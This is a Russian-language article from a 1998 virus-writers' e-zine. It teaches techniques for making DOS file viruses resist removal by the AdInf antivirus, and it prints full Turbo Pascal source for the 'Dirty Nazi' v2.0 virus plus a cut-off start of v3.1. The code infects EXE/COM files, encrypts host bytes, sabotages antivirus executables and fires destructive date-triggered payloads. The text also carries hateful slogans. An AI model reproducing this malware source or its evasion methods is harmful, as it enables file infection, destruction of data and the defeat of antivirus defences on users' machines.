
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV   1998
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ ▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ ▄▄█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄▄ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

              Как сделать вирус более живучим. Технологии.

                               "Меня давно бы засадили в grave,
                                Меня давно бы уж поймали в яму,
                                Меня давно бы уж нашли по следу
                                Но я не оставляю следов на свежем снегу
                                Не оставляю следов на снегу
                                Не оставляю следов на снегу
                                Не оставляю следов на снегу
                                Не оставляю следов на свежем снегу"

                                    Гражданская Оборона, "Следы на снегу"


1. Защита от выкусывания тела вируса из программы.

      Как оказалось, даже parasitic вирус второго подвида довольно
легко и без всяких проблем удаляется из программы автоматически
лечащим блоком AdInf'а Adinf Cure Module. Для тех, кто не знает,
что это за гадость такая, привожу выдержку из ADINF.TXT, входящего
в дистрибутивную поставку AdInf'а:

    От всех  существующих в  настоящее время  антивирусных программ  ADinf
отличается  тем,  что  он  работает  с  диском непосредственно по секторам
через  BIOS,  не  используя   DOS,  что  позволяет  успешно   обнаруживать
казавшиеся невидимыми так называемые  стелс-вирусы, берущие на себя  более
20 функций  DOS, а  также вирусы  в дисковом  драйвере, в  том числе новые
вирусы, неизвестные  ранее.   Этого не  может ни  одна другая антивирусная
программа!  Нашумевший  вирус  DIR,  вызвавший  массовую  эпидемию   летом
1991 г., был немедленно обнаружен ревизором ADinf.
     Работа  с  диском  на  уровне  BIOS  позволяет  всегда обнаруживать и
корректно  удалять  загрузочные  вирусы,  даже  если  они  взяли  на  себя
прерывание Int 13h.
     Из всего сказанного следует,  что Advanced Diskinfoscope в  настоящее
время является единственной антивирусной программой, которая при  загрузке
DOS  с  винчестера  (а  не  с  заклеенной  дискеты,  как  того требуют все
остальные  программы),  при  правильном  использовании,  обнаруживает  ВСЕ
существующие в настоящее время вирусы. Приобретайте ADinf, ставьте на  все
свои  компьютеры  и  золотая  пора  расцвета  техно-крыс,  пишущих вирусы,
завершится!
     Но это не все  достоинства рассматриваемой программы. Кроме  борьбы с
вирусами ADinf позволяет следить за целостностью и сохранностью информации
на винчестере и  за всеми происходящими  на диске изменениями,  что бывает
особенно полезно на  "персональных ЭВМ коллективного  пользования", широко
распространенных в нашей стране.
    Расширение  ревизора  ADinf  -  программа  ADinf  Cure  Module   (файл
ADinfExt.exe),   поддерживает   небольшую   дополнительную   базу  данных,
описывающую файлы, хранящиеся  на диске. В  случае обнаружения вируса  она
позволяет  немедленно  и  надежно  вылечить  Вашу  машину.   Лечению таким
способом  поддаются  до  97%  существующих  и,  что  самое главное, новых,
неизвестных на настоящий момент вирусов.

    Hе пугайтесь прочитанного :), "золотая пора расцвета техно-крыс,
пишущих вирусы," не завершится, все не так плохо, как написано, и
AdInf обойти тоже можно ;).

     Так вот, если на компьютере был установлен Adinf + Adinf Cure Module,
то скорее всего, всем Вашим стараниям наступит оппаньки. Запустит user
AdInf, тот заорет - "лажа, вирусы и всякий другой kal", запустит Куру
Модулу, и та быстренько восстановит все инфицированные файлы. И вирусу -
каюк. Однако, повторюсь, все не так плохо. Проблема с Курва-Модулой
решается довольно просто - достаточно зашифровать часть инфицируемого
файла, и Модула будет не в состоянии его восстановить. Eternal Maverick,
например, в своем Stone Heart II шифрует 512 байт после EXE-header'а,
я же предпочитаю шифровать переносимое в конец файла начало инфицируемой
программы (по длине равное длине вируса). В любом случае, ADinf Cure
Module сообщает, что инфицированный файл не может быть восстановлен.
        Реализаций шифровки может быть множество. Естественно, что
надо при шифровании использовать взаимообратимые команды (ведь нам
впоследствии нужно будет это дело расшифровывать ;). Подойдут пары
команд
                           ┌─────┬─────┐
                           │ ADD │ SUB │
                           ├─────┼─────┤
                           │ XOR │ XOR │
                           ├─────┼─────┤
                           │ INC │ DEC │
                           ├─────┼─────┤
                           │ NOT │ NOT │
                           └─────┴─────┘

ADD сложение                              ADD destination,source

         Логика:      destination = destination + source


        ADD  складывает  операнды и засылает  сумму  по  назначению
    (destination).  Оба  операнда  могут быть байтами или словами, и
    оба операнда могут быть двоичными числами со знаком или без знака.


SUB вычитание                              SUB destination,source

         Логика:      destination = destination - source

         Команда SUB вычитает операнд source из операнда destination
    и засылает результат по адресу destination. Оба  операнда  могут
    быть  байтами  или  словами, и оба операнда могут быть двоичными
    числами со знаком или без знака.


XOR исключающее или                         XOR destination,source                                                        ░

         Логика:      destination = destination XOR source

         XOR выполняет операцию исключающего или побитно над  своими
    операндами и засылает результат по назначению (destination). Оба
    операнда могут быть словами или байтами.

                          Логика команды XOR

            Destination         Source         Результат
                 0                0                0
                 0                1                1
                 1                0                1
                 1                1                0

         Команда XOR устанавливает каждый бит результата в 1, если в
    точности один из соответствующих битов операндов равен 1.


INC инкремент                               INC destination

         Логика:   destination = destination + 1

         Эта команда прибавляет к операнду destination единицу. Опе-
    ранд destination, который может быть словом или байтом,  интерп-
    ретируется как двоичное число без знака.


DEC декремент                               DEC destination

         Логика:   destination = destination - 1

         Эта команда отнимает от операнда destination единицу.  Опе-
    ранд  destination, который может быть словом или байтом, интерп-
    ретируется как двоичное число без знака.


NOT логическое отрицание                     NOT destination

         Логика: destination = NOT(destination); обратный код

         Команда NOT инвертирует каждый бит операнда (т.е. вырабаты-
    вает обратный код). Операндом может быть как байт, так и слово.

                          Логика команды NOT

                      destination      результат
                           0               1
                           1               0


        Шифровать можно по байту и по слову, причем по слову намного
эффективнее, поскольку при шифровании по байту значение расшифровщика
находится в диапазоне 0..255, а при шифровании по слову - 0..65535.
Значение расшифровщика можно хранить где-нибудь в теле вируса.

     ┌─────────────────────────────────────────────────────────┐
     │ ОБРАТИТЕ ВHИМАHИЕ, что при шифровке по слову длина тела │
     │ вируса ОБЯЗАТЕЛЬHО должна быть кратной 2.               │
     └─────────────────────────────────────────────────────────┘

     ┌─────────────────────────────────────────────────────────┐
     │ Еще один важный момент - тот, кто будет раскапывать Ваш │
     │ вирус, предполагает, что в начале зашифрованной части   │
     │ программы, находящейся в конце файла, содержится за-    │
     │ шифрованная сигнатура EXE-файла - MZ. Поэтому найти     │
     │ расшифровщик довольно легко. ИЗМЕHЯЙТЕ первые два байта │
     │ буфера, содержащего часть инфицируемой программы, перед │
     │ шифрованием на какой-либо мусор, а после дешифровки     │
     │ помещайте в первые два байта буфера 'MZ' (возвращая     │
     │ тем самым сигнатуру EXE-файла обратно).                 │
     └─────────────────────────────────────────────────────────┘

        Дабы максимально затруднить расшифровку, можно использовать
все четыре метода (add/sub, xor/xor, inc/dec и not/not), меняя их
при инфицировании каждого файла, а в теле вируса держать таблицу, содер-
жащую значение расшифровщика и номер использованного метода. Причем,
если используется третий и четвертый метод, то значение расшифровщика
роли не играет. Можно перемежать несколько методов - например, сначала
зашифровать вторым методом, потом четвертым. Hу а расшифровывать соот-
ветственно наоборот ;)
        Hиже представлен исходник вируса, шифрующий начало инфицируемой
программы первым методом по байту. Это вторая версия вируса Dirty Nazi,
с которым Вы уже встречались в Части 2 Пункте 2.2.2. Отличается от
первой версии добавленным механизмом шифровки и парой исправленных
глюков (а также парой добавленных новых ;). Так что пронаблюдать
алгоритм шифровки, сравнивая первую и вторую версию, будет довольно
просто.

{ VirusName    :  Dirty Nazi       }
{ Version      :  2.0 beta         }
{ Target       :  *.EXE *.COM      }
{ Stealth      :  No               }
{ TSR          :  No               }
{ Attac Speed  :  Slow             }
{ Danger       :  2                }
{ Effects      :  Yes              }
{ Length       :  8600             }
{ Compiler     :  Turbo Pascal 5.5 }
{ BodyStatus   :  Packed           }
{ Packer       :  Pklite.exe       }

{               * Copyleft  (cl)  Dirty Nazi  1995 *                       }
                  { All suggestions are welcome! }

{ Объяснения по работе -- в конце исходника }

{$M 2048 , 0 , 0}

Uses Dos , Crt;

 Const
     Nazi      =  'NAZI';          { Метка вируса }
     { вообще-то там стоит "NAZI v2.0beta", но ищем мы только "NAZI" }
     VirLen    =  8600;            { Длина упакованного файла }
     RunError  =  #13#10'Abnormal program termination';
     WinReboot : Array [1..5] of Byte = ($EA,$00,$00,$FF,$FF);
     WinProg   :  Array [1..2] of Byte = ($FA,$F4);  { CLI , HLT }
     BadCom    :  Array [1..35] of Byte = ($B4,$09,$BA,$08,$01,
                                           $CD,$21,$C3,$42,$61,$64,
     { MOV AH , 09h }                      $20,$63,$6F,$6D,$6D,
     { LEA DX , BAD }                      $61,$6E,$64,$20,$6F,
     { INT 21h }                           $72,$20,$66,$69,$6C,$65,
     { RET }                               $20,$6E,$61,$6D,$65,
     { BAD DB 'Bad command or file ' }     $0D,$0A,$24);
     {     DB 'name' , 0Dh , 0Ah , '$' }


 Var
    VirIdentifier     :   Array [1..4] of Char;
    VirBody           :   File;
    O3H  , Br         :   Pointer;
    CmdLine           :   String;
    OurName           :   String;
    I                 :   Integer;
    Dir               :   String;       { переменные для работы }
    Ext               :   ExtStr;
    Name              :   NameStr;
    Target            :   File;
    TargetFile        :   String;
    VirBuf            :   Array [1..VirLen] of Char; { массивы для записи }
    TargetBuf         :   Array [1..VirLen] of Char; { тела вируса и инфици- }
    Attr              :   Word;                      { руемой программы }
    Time              :   LongInt;
    Old1C             :   Procedure;
    Delayer           :   LongInt;
    Waiter            :   LongInt;
    InfFiles          :   Byte;
    DirInfo           :   SearchRec;
    Regs              :   Registers;
    Coder , DeCoder   :   Byte;

{$F+}
 procedure MyWaiter; Interrupt;
  begin

      Inc(Waiter);
      Old1C;

  end; { end proc }
{$F-}

 procedure Wait(Delayer : LongInt);
  begin

      Waiter:=0;
      Repeat Until Waiter >= Delayer;

  end; { end proc }

 procedure CheckWriteProtect;       { проверка, не стоит ли на диске }
  begin                             { Write Protect }

   Assign(VirBody , '\'+#$FF);     { Invisible file ! }
   ReWrite(VirBody);
   Erase(VirBody);

   If IOResult <> 0 Then
     begin
         WriteLn(RunError);        { Если стоит, то пусть снимут, ато }
         SwapVectors;
         SetIntVec($1C , @Old1C);
         Halt(8);                  { работать не будем }
     end;
 end;

 procedure CheckVirusBody;              { проверка на случай, если нас }
  begin                                 { упаковали каким-нибудь DIET'ом }

      Assign(VirBody , ParamStr(0));
      Reset(VirBody , 1);
      Seek(VirBody , 32);

      BlockRead(VirBody , VirIdentifier , 4);

      Close(VirBody);
                                      { Из тела запущенной программы }
      If VirIdentifier <> Nazi Then   { считываем метку вируса и, если }
       begin                          { таковой не найдено, halt'им }
           WriteLn(RunError);         { программу }
           SwapVectors;
           SetIntVec($1C , @Old1C);
           Halt(8);        { ErrorLevel = 8 , Not Enough Memory! ;-) }
       end;
  end;      { Конец этой увлекательной процедуры }

{$F+}
  procedure ReBoot; Interrupt;
   begin                         { А это для того, чтобы нехорошие дяди }
    InLine($EA/                  { Лозинские не запускали Debug t }
           $00/
           $00/
           $FF/
           $FF);
   end;
{$F-}

{$F+}
  procedure BreakOff; Interrupt;
   begin
              { Invisible Magic Words! }
   end;
{$F-}

 procedure Information;
  begin

      If ParamStr(1)='/??' Then        { Если нам передали вот такой }
       begin                           { параметр, то рассказываем о себе }
          InLine($B4/
                 $01/                              { MOV AH, 01h }
                 $B5/       { Прячем курсор }
                 $20/                              { MOV CH, 20h }
                 $CD/
                 $10);                             { INT 10h }

          TextBackGround(0);
          ClrScr;

          WriteLn(#13#10);

          TextColor(LightGreen);

          WriteLn('  ╔═══════════════════════════════╗');
          WriteLn('  ║ Name             "Dirty Nazi" ║');
          WriteLn('  ║ Type             Virus        ║');
          WriteLn('  ║ Version          2.0 beta     ║');
          WriteLn('  ║ Target           *.COM *.EXE  ║');
          WriteLn('  ║ Stealth          No           ║');
          WriteLn('  ║ TSR              No           ║');
          WriteLn('  ║ Attac speed      Slow         ║');
          WriteLn('  ║ Danger           2            ║');
          WriteLn('  ║ Effects          Yes          ║');
          WriteLn('  ║ Length           ' , VirLen , '         ║');
          WriteLn('  ║ Language         Turbo Pascal ║');
          WriteLn('  ╚═══════════════════════════════╝'#13#10#13#10);

          TextColor(14);
          TextBackGround(9);

          Write('▀▀▀▀▀');           { Украинский флаг }

          TextColor(15);
          TextBackGround(0);

          WriteLn('   Copyleft (cl) Dirty Nazi 1955');

          InLine($FA/            { CLI }        { System }
                 $F4);           { HLT }        { halted }

       end;
 end;         { end proc }

 procedure Init;                { Процедура инициализации переменных }
  begin                         { программы и проверки условий работы }

     OurName:=ParamStr(0);     { Имя запущенной программы }

     GetIntVec($03 , O3H);                  { Вешаем антитрассировщик }
     SetIntVec($03 , @ReBoot);              { на int 3h }

     GetIntVec($1B , Br);                   { заменяем вектор ^C }
     SetIntVec($1B , @BreakOff);
     SetCBreak(False);                      { и отключаем ^C }

     GetIntVec($1C , @Old1C);
     SetIntVec($1C , @MyWaiter);

     CheckWriteProtect;           { Проверяем, не на Read Only ли диске }
                                  { нас хотели запустить }
     CheckVirusBody;              { Проверяем, не споплюжили ли нам код }

     Information;                 { и не хотят ли Инфо получить }

     InfFiles:=0;
                                  { Инициализируем параметры }
     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen); { Считываем в буфер тело вируса }

     Close(VirBody);

     Decoder:=Ord(VirBuf[163]);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { считываем параметры }
        End;                                       { в командной строке }

     Dir:='';

 end;   { end proc }

 procedure ExecOriginal;     { Процедура исполнения зараженной программы }
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);  { Получаем полную инфор- }
                                                 { мацию о файле в пере- }
                                                 { менную DirInfo }
    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;          { Запоминаем дату/время и атрибуты файла }
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);    { Устанавливаем аттрибут Archive }

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockRead(VirBody , TargetBuf , VirLen);   { "Лечим" зараженный файл }

    Seek(VirBody , DirInfo.Size - VirLen);
    Truncate(VirBody);

    For I:=1 To VirLen Do
      TargetBuf[I]:=Chr(Ord(TargetBuf[I]) - Decoder);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SetIntVec($03 , O3H);      { Восстанавливаем захваченные векторы }
    SetIntVec($1B , Br);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);  { Исполняем }
    SwapVectors;
    If DosError <> 0 Then
         WriteLn(#13#10'This program requires Dmitry Lozinsky'#13#10);

    Assign(VirBody , ParamStr(0));
                                                 { Заражаем в обратном }
    SetFAttr(VirBody , Archive);                 { порядке }

    Reset(VirBody , 1);

    Randomize;

    Coder:=Random(255);

    For I:=1 To VirLen Do
       TargetBuf[I]:=Chr(Ord(TargetBuf[I]) + Coder);

       VirBuf[163]:=Chr(Coder);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);         { восстанавливаем дату/время и }
    SetFAttr(VirBody , Attr);         { атрибуты файла }

    Close(VirBody);

    SetIntVec($1C , @Old1C);

 end;   { end proc }

 procedure FuckAntiVirus;       { а это -- для антивирусников }
  begin

    FindFirst(TargetFile , AnyFile , DirInfo); { Получаем инфо о файле в }
                                               { переменную Dirinfo }
    Assign(Target , TargetFile);

    Time:=DirInfo.Time;          { Запоминаем дату/время и }
    Attr:=DirInfo.Attr;          { атрибуты фала }

    SetFAttr(Target , Archive);   { Устанавливаем Archive }

    Reset(Target , 1);

    Seek(Target , 0);

    BlockWrite(Target , BadCom , 35); { перезаписываем начало }

    SetFTime(Target , Time);    { восстанавливаем дату/время и }
    SetFAttr(Target , Attr);    { атрибуты файла }

    Close(Target);              { теперь антивирусник будет после вызова }
                                { сразу же красиво возвращать управление }
  end;    { end proc }          { системе с сообщением о том, что вызываемая }
                                { программа на диске не обнаружена ;-) }

 procedure FindTarget(Dir : PathStr);   { процедура поиска жертвы }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;    { функция, проверяющая файл на }
  begin                              { зараженность }

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , 32);
     BlockRead(Target , VirIdentifier , 4);

     If VirIdentifier = Nazi Then    { Если есть метка, то есть и вирус }
      VirusPresent:=True;

     Close(Target);

 end;  { end func }

 function WindowsProgram : Boolean;     { Функция, возвращающая True, }
  Var                                   { если программа написана под }
    WindowsBuf : Array [1..4] of Char;  { Windows }
  begin

     WindowsProgram:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , 517);
     BlockRead(Target , WindowsBuf , 4);
     If ((WindowsBuf = 'is p') Or (WindowsBuf = 'нная')) Then
      begin
          WindowsProgram:=True;
          Seek(Target , 512);
          BlockWrite(Target , WinReboot, 5);
      end;

     Close(Target);

  end; { end func }

 procedure InfectFile;   { процедура заражения файла }
  begin

   If (((Ext = '.COM') And ((Sr.Size < 20000) Or (Sr.Size > 65000
      - VirLen)))) Then Exit;
   If Sr.Name = 'COMMAND.COM' Then Exit;
   If Sr.Name = 'IBMBIO.COM' Then Exit; { проверяем файлы, которые заражать }
   If Sr.Name = 'IBMDOS.COM' Then Exit; { не надо }
   If Sr.Name = 'NCMAIN.EXE' Then Exit;
   If Sr.Name = 'EMM386.EXE' Then Exit; { это чтобы не портить драйвера }
   If Sr.Name = 'QEMM.EXE' Then Exit;
   If Sr.Name = 'WIN.COM' Then Exit; { а это чтобы Форточки не разражались }
   { диким криком о том, что какое-то приложение нарушает целостность }
   { системы! }
   If ((Ext = '.EXE') And (Sr.Size < VirLen)) Then Exit;

   If ((Not VirusPresent) And (Not WindowsProgram)) Then
    begin                        { если файл уже не заражен, }
                                 { не Windows-прог, то }
                                 { заразим его }
       Time:=Sr.Time;          { сохраняем дату/время и }
       Attr:=Sr.Attr;          { атрибуты файла }

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);   { Устанавливаем Archive }
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Randomize;

       Coder:=Random(255);

       For I:=1 To VirLen Do
        TargetBuf[I]:=Chr(Ord(TargetBuf[I]) + Coder);

       VirBuf[163]:=Chr(Coder);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);
                                                   { заражаем }
       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       SetFAttr(Target , Attr);     { восстанавливаем дату/время и }
       SetFTime(Target , Time);     { атрибуты файла }

       Close(Target);

       Inc(InfFiles);               { увеличиваем счетчик зараженных }
                                    { файлов на 1 }
    end;
 end;    { end proc }

 procedure CheckAnti;          { процедура проверки, не антивирусник ли }
  begin                        { нам попался }

    If (Name = 'AIDSTEST') Or
       (Name = 'TESTAIDS') Or
       (Name = 'DRWEB')    Or
       (Name = 'WEB')      Or
       (Name = 'ADINF')    Or
       (Name = 'ADINFEXT') Then FuckAntiVirus Else InfectFile;
  end;

  begin

      Dir:=Dir + '\';         { устанавливаем корневой каталог }

      FindFirst(Dir + '*.*', AnyFile , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Dir + Sr.Name;   { имя и путь к найденному файлу }

 { Полу- } Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
 { чаем }  Name:=Copy(Sr.Name , 1 , Length(Sr.Name) - Length(Ext));
 { имя и расширение найденного файла }
           If Ext = '.EXE' Then CheckAnti;  { Если .EXE или .COM -- тогда }
           If Ext = '.COM' Then CheckAnti;  { начинаем процесс заражения }

           If InfFiles > 0 Then Exit;       { если заразили 1 файл -- }
                                            { заканчиваем работу }
           FindNext(Sr);

         end;


      FindFirst(Dir + '*.*' , AnyFile , Sr);
       While DosError = 0 Do
        begin

          If (Sr.Name[1] <> '.') And (Sr.Attr = Directory) Then
             FindTarget(Dir + Sr.Name);

         FindNext(Sr);

       end;
  end;      { end proc }

{$F+}
 procedure Int09h;  Interrupt;
   begin
                { Пустая процедура для отключения клавиатуры }
   end;
{$F-}

 procedure Cross;   { Процедура размножения креста на экране }

  Var
     J , X , Y  :  Byte;

 procedure WriteCross;  { Процедура рисования креста ОДИН раз на экране }
  begin

        Write('█   █▀▀▀▀');
        If Y > 2 Then Inc(Y);
        GoToXY(X , Y + 1);
        Write('█   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀█▀▀▀█');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('    █   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀▀   ▀');

  end; { end proc }

  begin

    InLine($B4/
           $01/
           $B5/       { Hide cursor }
           $20/
           $CD/
           $10);

    HighVideo;

    TextBackGround(4);  { Красный фон }
    TextColor(0);       { черный цвет }
    ClrScr;

   X:=3;
   Y:=1;

   For I:=1 To 6 Do
    begin
      GoToXY(X , Y);
      For J:=1 To 5 Do          { заполняем экран крестами }
       begin
           WriteCross;
        Inc(Y);
        GoToXY(X , Y + 1);
       end;
      Y:=1;
      X:=X + 13;
    end;
    Intr($5 , Regs);           { и заодно выводим их на принтер }

  end;   { end proc }

 procedure Augustin;     { А это процедура исполнения известной мелодии }

   Var
      T      :  Array [1..12] of Integer;
      Kt     :  Array [1..48] of Integer;
      L , Q  :  Integer;

 begin

  Q := 4;

  T[1]:=131; T[2]:=139; T[3]:=147; T[4]:=156; T[5]:=165;
  T[6]:=175; T[7]:=185; T[8]:=196; T[9]:=208; T[10]:=220;
  T[11]:=223; T[12]:=247;

  For L:=1 To 12 Do Kt[L]:=T[L] Div 2;
  For L:=1 To 12 Do Kt[L + 12]:=T[L];
  For L:=1 To 12 Do Kt[L + 24]:=2 * T[L];
  For L:=1 To 12 Do Kt[L + 36]:=4 * T[L];

  Repeat

    Sound(Kt[32]); Wait(3 * Q); NoSound;
    Sound(Kt[34]); Wait(Q); NoSound;
    Sound(Kt[32]); Wait(q); NoSound;
    Sound(Kt[30]); Wait(q); NoSound;
    Sound(Kt[29]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[27]); Wait(2 * q); NoSound;
    Sound(Kt[20]); Wait(2 * q); NoSound;
    Sound(Kt[20]); Wait(2 * q); NoSound;
    Sound(Kt[29]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[32]); Wait(3 * q); NoSound;
    Sound(Kt[34]); Wait(q); NoSound;
    Sound(Kt[32]); Wait(q); NoSound;
    Sound(Kt[30]); Wait(q); NoSound;
    Sound(Kt[29]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(2 * q); NoSound;
    Sound(Kt[27]); Wait(2 * q); NoSound;
    Sound(Kt[20]); Wait(2 * q); NoSound;
    Sound(Kt[20]); Wait(2 * q); NoSound;
    Sound(Kt[25]); Wait(q); NoSound;
    Wait(5 * q);

  Until KeyPressed;

 end;      { end proc }
 procedure CheckDateAndTime;  { процедура проверки даты/времени }

  Var
    H , M , S , Ms : Word;         { Работа по аналогии с песней }
                                   { "22 июня ровно в 4 часа }
  begin                            {  ^^ ^^^^ ^^^^^   ^      }
                                   { Киев бомбили, нам объявили }
   GetTime(H , M , S , Ms);        { Что началася война" }

   If (((H = 4) And (M = 0)) Or ((H = 16) And (M = 0))) Then
      begin
         SetIntVec($09 , @Int09h);  { Если ровно 4:00 или 16:00 }
         Cross;                     { то рисуем кресты и играем }
         Augustin;                  { мелодию }
      end;

   GetDate(H , M , S , Ms);

   If ((M = 6) And (S = 22)) Then     { Если 22 июня, то }
      begin

         InLine($B4/
                $01/
                $B5/              { hide cursor }
                $20/
                $CD/
                $10);

         SetIntVec($09 , @Int09h);  { hook int 09h }

         TextColor(15);
         TextBackGround(0);
         ClrScr;


         WriteLn(#13#10);
         WriteLn(' ╔══════════════════════════════════╗');
         WriteLn(' ║ Dirty Nazi Virus. Nazi not dead! ║');
         WriteLn(' ║ Today is 22/06.  Congratulations ║'); { выводим }
         WriteLn(' ║ from  fUcKRAINE !  I don''t wanna ║'); { информацию }
         WriteLn(' ║ serve u today so have a rest!    ║'); { о вирусе }
         WriteLn(' ║           C u tomorrow!          ║');
         WriteLn(' ╠══════════════════════════════════╣');
         WriteLn(' ║  (cl)  Kiev Computer Virus Club  ║');
         WriteLn(' ╚══════════════════════════════════╝');

         Wait(400);                          { ждем, пока прочтут }

         Cross;                         { кресты и мелодия }
         Augustin;

      end;

    If ((M = 5) And (S = 9)) Then
        InLine($B8/
               $11/
               $05/
               $B9/
               $01/
               $00/
               $BA/
               $80/
               $00/
               $CD/
               $13/
               $FA/        { CLI }
               $F4);       { HLT }

  end;  { end proc }


 begin  { * MAIN * }

     Init;                    { Инициализируемся }

     FindTarget(Dir);         { Ищем жертвы и заражаем их }

     CheckDateAndTime;        { Не пора ли нам показать себя ? }

     ExecOriginal;            { Исполняем зараженную программу }

 end.   { * И ТАКАЯ БЕЛАЯ ПОЛОСА... * }

        Если кому-то придет в голову это чудо откомпайлить и чего-нибудь
заразить, то после компиляции не забудьте в теле вируса по смещению
0Ah поставить 0 - начальное значение расшифровщика.


               Шифрование текстовых фрагментов в теле вируса.

        Шифрование текстовых фрагментов в теле вируса (строки *.COM,
*.EXE, COMSPEC и пр.) относится к разделу антиюзериады. В последнее
время развелось много юзеров, которые гордятся своим умением нажать
F3 на exeшнике и посмотреть, нет ли там строк "virus", сравнить
количество оперативной памяти в Hортоне с 640k и тому подобное.
Так вот если такой юзер на нашем вирусе F3 нажмет, да увидит
*.EXE, *.COM, а тем более если "VirUs QwERtY bY cYbErMaZAfaKa" или
подобную фразу - программа тут же безжалостно уничтожается. Естест-
венно, наш вирус тоже. Поэтому предлагается небольшой антиюзерский
прием.
        Все текстовые строки располагаем в одном массиве типа
String. После компиляции залезаем в полученный EXE-файл Hacker's
Viewer'ом и шифруем xor'ом этот массив. В самом начале
программы расшифровываем этот массив. А к строкам обращаемся
через массив - например, поиск EXE-файлов осуществляем следующим
образом:

Var
  Crypt : Array [1..10] Of String;
  A , B : Byte;
  Sr    : SearchRec;
  . . . . .

begin

     Crypt[1]:='Virus "Fucker"';
     . . . . .
     Crypt[5]:='*.EXE';
     . . . . .
     Crypt[10]:='COMSPEC';

     For A:=1 To 10 Do  { Разшифровываем массив со строками }
         For B:=1 To Length(Crypt[A]) Do
             Crypt[A,B]:=Chr(Ord(Crypt[A,B]) Xor $AA);
                                               { ^^^ Число, по
     которому мы поXORили массив со строками в EXE-файле }
     . . . . .

     FindFirst(Crypt[5],Archive,Sr); { Ищем EXE-файлы }

     . . . . .
end.
        И все - ничего сложного, но действенно.

        Hиже представлен исходник вируса Dirty Nazi версии 3.1beta,
в котором используется шифрование текстовых строк в теле вируса. Также
в нем представлен алгоритм шифрования начала инфицируемого файла по
слову (xor word) с последующим шифрованием операцией add, а после
операцией not. То бишь принцип такой:

         При зашифровке

         1. Буфер Xor Coder
         2. Буфер Add Coder
         3. Not Буфер.

         При расшифровке

         1. Not Буфер.
         2. Буфер Sub Coder
         3. Буфер Xor Coder.

        Hу и на десерт - уничтожение таблиц AdInf'а. Проверил с
последней версией AdInf'а - работает, юзайте.
        Да, и еще - дабы не поняли сразу, в каком байте или слове Вы
расшифровщик держите (ведь расшифровщик - единственное, что меняется
от файла к файлу в теле вируса), желательно изменять еще байт 50 - 100
в теле случайным образом (чем больше - тем лучше). Пусть пробуют все
комбинации ;). Реализацию такого изменения Вы могли видеть в Части 3
Пункте 2 (вирус Izvrat) и имеете возможность пронаблюдать в этом вирусе.

{ VirusName    :  Dirty Nazi        }
{ Version      :  3.1 beta Bugs Fix }
{ Target       :  *.EXE *.COM       }
{ Stealth      :  No                }
{ TSR          :  No                }
{ Attac Speed  :  Slow              }
{ Danger       :  5                 }
{ Effects      :  Yes               }
{ Length       :  6528              }
{ Compiler     :  Turbo Pascal 6.0  }
{ BodyStatus   :  Packed            }
{ Packer       :  Pklite.exe        }

{               * Copyleft  (cl)  Dirty Nazi  1996 *                       }
                  { All suggestions are welcome! }
{$M 2048 , 0 , 0}

Uses Dos;

 Const
     VirLen    =  6528;            { Длина упакованного файла }

 Var
    VirBody           :   File;
    CmdLine           :   String;
    OurName           :   String;
    I                 :   Integer;
    J                 :   Integer;
    Dir               :   String;       { переменные для работы }
    Ext               :   ExtStr;
    DT                :   DateTime;      { для измeнeния дaты/вpeмeни }
    Name              :   NameStr;
    Target            :   File;
    TargetFile        :   String;
    VirBuf            :   Array [1..VirLen] of Char; { массивы для записи }
